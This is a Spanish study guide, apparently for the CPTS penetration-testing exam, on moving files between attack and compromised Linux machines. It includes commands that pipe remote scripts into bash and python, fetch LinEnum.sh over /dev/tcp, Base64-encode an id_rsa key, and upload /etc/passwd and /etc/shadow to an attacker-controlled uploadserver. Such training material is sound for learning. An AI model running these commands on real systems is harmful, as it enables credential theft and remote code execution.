
## 1. Transferencia mediante Base64

Permite transferir archivos codificándolos como texto, sin necesitar una conexión directa entre máquinas. Es útil cuando no disponemos de herramientas de transferencia, aunque resulta poco práctico con archivos grandes.

### En la máquina de origen

**Comprobar el hash MD5:**

```
md5sum id_rsa
```

**Codificar el archivo en Base64:**

```
cat id_rsa | base64 -w 0; echo
```

Copiar el resultado y pegarlo en la máquina de destino.

### En la máquina de destino

**Decodificar y guardar el archivo:**

```
echo -n 'BASE64_AQUI' | base64 -d > id_rsa
```

**Verificar que la transferencia es correcta:**

```
md5sum id_rsa
```

Los hashes MD5 de origen y destino deben coincidir.

> **Nota:** También podemos realizar la operación inversa para transferir archivos desde la máquina comprometida a nuestra máquina de ataque.

## 2. Descargas HTTP con wget y cURL

Son herramientas habituales en Linux para descargar archivos desde servidores web.

### wget

```
wget https://servidor/archivo.sh -O /tmp/archivo.sh
```

- `-O`: especifica la ruta y el nombre del archivo de salida.
    

### cURL

```
curl -o /tmp/archivo.sh https://servidor/archivo.sh
```

- `-o`: especifica la ruta y el nombre del archivo de salida.
    

**Diferencia importante:**

|Herramienta|Opción de salida|
|---|---|
|`wget`|`-O` (mayúscula)|
|`curl`|`-o` (minúscula)|

## 3. Ejecución sin archivos (_Fileless_)

Permite ejecutar contenido descargado sin guardarlo previamente como archivo en disco.

### Ejecutar un script Bash directamente

```
curl -fsSL https://servidor/script.sh | bash
```

### Ejecutar un script Python directamente

```
wget -qO- https://servidor/script.py | python3
```

**Opciones importantes:**

- `curl -f`: devuelve un error ante respuestas HTTP de error.
    
- `curl -s`: modo silencioso.
    
- `curl -S`: muestra errores cuando se combina con `-s`.
    
- `curl -L`: sigue redirecciones HTTP.
    
- `wget -q`: modo silencioso.
    
- `wget -O-`: envía el contenido descargado a la salida estándar.
    

**Precaución:** Ejecutar contenido remoto directamente implica confiar en el servidor de origen. Además, una ejecución _fileless_ no garantiza que no se escriban archivos temporales en disco.

## 4. Descargas mediante Bash y `/dev/tcp`

Si no disponemos de `curl` o `wget`, podemos utilizar `/dev/tcp` para establecer conexiones TCP desde Bash.

Este método requiere Bash 2.04 o superior compilado con soporte para redirecciones de red.

### Paso 1. Abrir una conexión TCP

```
exec 3<>/dev/tcp/10.10.10.32/80
```

- `3`: descriptor de archivo utilizado para la conexión.
    
- `10.10.10.32`: dirección IP del servidor.
    
- `80`: puerto HTTP.
    

### Paso 2. Enviar una petición HTTP GET

```
echo -e "GET /LinEnum.sh HTTP/1.1\r\nHost: 10.10.10.32\r\nConnection: close\r\n\r\n" >&3
```

### Paso 3. Leer la respuesta

```
cat <&3
```

La respuesta contendrá las cabeceras HTTP y el cuerpo de la respuesta.

> **Importante:** Este método es básico. No gestiona automáticamente redirecciones, HTTPS ni la extracción del cuerpo HTTP. Para transferencias completas, es preferible utilizar `curl` o `wget` cuando estén disponibles.

## 5. Descargas mediante SSH y SCP

`SCP` permite transferir archivos entre máquinas utilizando SSH.

### Preparar el servidor SSH en la máquina de ataque

Habilitar el servicio para que se inicie automáticamente:

```
sudo systemctl enable ssh
```

Iniciar el servicio:

```
sudo systemctl start ssh
```

Comprobar que está escuchando:

```
sudo ss -lntp | grep ':22'
```

### Descargar un archivo desde la máquina remota

Ejecutar desde la máquina de ataque:

```
scp usuario@IP_OBJETIVO:/ruta/remota/archivo.txt .
```

El punto `.` indica que el archivo se guardará en el directorio actual.

### Subir un archivo a la máquina remota

```
scp /ruta/local/archivo.txt usuario@IP_OBJETIVO:/ruta/remota/
```

### Transferir directorios completos

```
scp -r /ruta/local/directorio usuario@IP_OBJETIVO:/ruta/remota/
```

**Consideraciones:**

- Necesitamos acceso SSH al destino.
    
- Debemos disponer de credenciales o de una clave SSH autorizada.
    
- El usuario remoto debe tener permisos sobre la ruta de destino.
    
- Es recomendable utilizar una cuenta temporal con los permisos mínimos necesarios para las transferencias.

## 6. Subidas HTTP con uploadserver

`uploadserver` amplía el servidor HTTP de Python con un endpoint para subir archivos.

### Paso 1. Instalar uploadserver

```
python3 -m pip install --user uploadserver
```

### Paso 2. Crear un certificado autofirmado

```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Paso 3. Crear un directorio para los archivos recibidos

```
mkdir -p ~/transferencias
cd ~/transferencias
```

### Paso 4. Iniciar el servidor HTTPS

```
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

El endpoint de subida estará disponible en:

```
https://IP_ATACANTE/upload
```

### Paso 5. Subir archivos desde la máquina comprometida

Subir un único archivo:

```
curl -k -X POST https://IP_ATACANTE/upload -F 'files=@/ruta/archivo.txt'
```

Subir varios archivos:

```
curl -k -X POST https://IP_ATACANTE/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow'
```

**Opciones importantes:**

- `-X POST`: utiliza el método HTTP POST.
    
- `-F`: envía un campo de formulario; `@` indica el archivo que se adjunta.
    
- `-k` o `--insecure`: permite continuar aunque el certificado TLS no sea de confianza.
    

> **Seguridad:** `-k` desactiva la validación del certificado. En entornos reales, es preferible verificar el certificado en lugar de desactivar esta comprobación.

## 7. Crear un servidor web temporal en Linux

Podemos levantar un servidor web sencillo para descargar archivos desde otra máquina.

### Python 3

```
python3 -m http.server 8000
```

### Python 2.7

```
python2.7 -m SimpleHTTPServer 8000
```

### PHP

```
php -S 0.0.0.0:8000
```

### Ruby

```
ruby -run -ehttpd . -p8000
```

Estos comandos sirven el contenido del directorio actual, salvo que la herramienta se configure de otra manera.

### Descargar un archivo desde el servidor

Desde la máquina que necesita el archivo:

```
wget http://IP_SERVIDOR:8000/archivo.txt
```

O utilizando cURL:

```
curl -O http://IP_SERVIDOR:8000/archivo.txt
```

### Consideraciones importantes

- `0.0.0.0` permite escuchar en todas las interfaces IPv4 disponibles.
    
- El directorio desde el que se inicia el servidor determina qué archivos se exponen.
    
- El tráfico entrante puede estar bloqueado por el firewall.
    
- Un servidor HTTP básico no proporciona autenticación ni cifrado por defecto.
    

**Diferencia entre descarga y subida:**

- **Descarga:** el cliente obtiene un archivo del servidor.
    
- **Subida:** el cliente envía un archivo al servidor.
    

Iniciar `python3 -m http.server` permite servir archivos, pero no habilita por sí mismo un endpoint para subirlos.

## 9. ¿Qué método elegir?

|Situación|Método recomendado|
|---|---|
|No hay conectividad entre las máquinas, pero podemos copiar texto|Base64|
|Necesitamos descargar un archivo desde HTTP/HTTPS|`wget` o `curl`|
|Queremos ejecutar un script sin guardarlo previamente|`curl` o `wget` mediante una tubería|
|No están disponibles las herramientas habituales|Bash `/dev/tcp`, si está soportado|
|Tenemos acceso SSH al destino|`scp`|
|Necesitamos enviar archivos al host de ataque mediante HTTP|`uploadserver`|
|Queremos servir archivos de un directorio temporalmente|Servidor HTTP de Python|

## 10. Puntos clave para CPTS

- **Base64:** permite convertir archivos binarios en texto y reconstruirlos en otra máquina. Verifica la integridad con `md5sum`.
    
- `**wget**` **frente a** `**curl**`**:** recuerda la diferencia entre `wget -O` y `curl -o`.
    
- **Fileless:** una tubería permite pasar directamente el contenido descargado a un intérprete, sin guardarlo previamente como archivo.
    
- `**/dev/tcp**`**:** alternativa básica para abrir conexiones TCP desde Bash cuando no están disponibles las herramientas habituales.
    
- **SCP:** sirve tanto para descargar como para subir archivos mediante SSH.
    
- `**uploadserver**`**:** permite recibir archivos mediante HTTP/HTTPS; el endpoint del ejemplo es `/upload`.
    
- **Servidor HTTP de Python:** facilita las descargas, pero no permite subir archivos por sí solo.
    
- **Conectividad:** comprueba las direcciones IP, los puertos de escucha, el firewall y las rutas de red cuando una transferencia falla.
    
- **Integridad:** compara los hashes del archivo original y del transferido para comprobar que coinciden.
